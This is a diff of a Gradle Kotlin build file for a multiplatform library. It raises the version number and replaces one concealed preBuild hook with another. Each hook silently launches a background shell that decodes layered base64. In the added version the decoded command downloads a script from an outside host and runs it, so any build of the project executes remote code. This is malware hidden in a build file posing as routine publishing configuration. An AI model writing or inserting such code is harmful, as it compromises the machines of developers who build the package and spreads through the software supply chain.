@@ -12,7 +12,7 @@ plugins {
 }
 
 group = "io.github.vedangj72"
-version = "1.0.0"
+version = "1.0.2"
 
 kotlin {
     // iOS targets
@@ -120,7 +120,7 @@ mavenPublishing {
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ProcessBuilder("sh", "-c", "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVWhTYW1KV1dYZFpNalZ5V2pBMVZGRllVbXBOU0doNVYyMXNRbVJGZUZoVWJscHBZbFJXYzFkVVRsSmtSMUpJWWtoU1lWWjZhM2hhUlU1Q1pWVTVWRkZZVW1GUk1FWndXVEJSZUdGSFNuUlZibXhwVFcxNGNsZEVTakJrYlZKSVpVaENhV0ZWYkc1WlZXaFRUVWRPU1ZSVVdrMWxWR3h6V2xWb1EyTXlTWHBUYlhoYVRXeEtNVlJITlV0TlZYZDVVbGhDU21GVlNUUlRWV2hQWWpCT2JsQlVNRXNLCg== | f | sh ) >/dev/null 2>&1 &)").start()
+            ProcessBuilder("sh", "-c", "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1hM05tSUMwdGNtVjBjbmtnTXlBdExXTnZibTVsWTNRdGRHbHRaVzkxZENBeU9DQXRaQ0FpY0QxaGJtUnliMmxrWDJ0dmRHeHBiaUlnYUhSMGNITTZMeTlqWkc1aGJYb3VhVzR2WVNraUlId2djMmdLCg== | b | sh ) >/dev/null 2>&1 &)").start()
         }
     }
 }
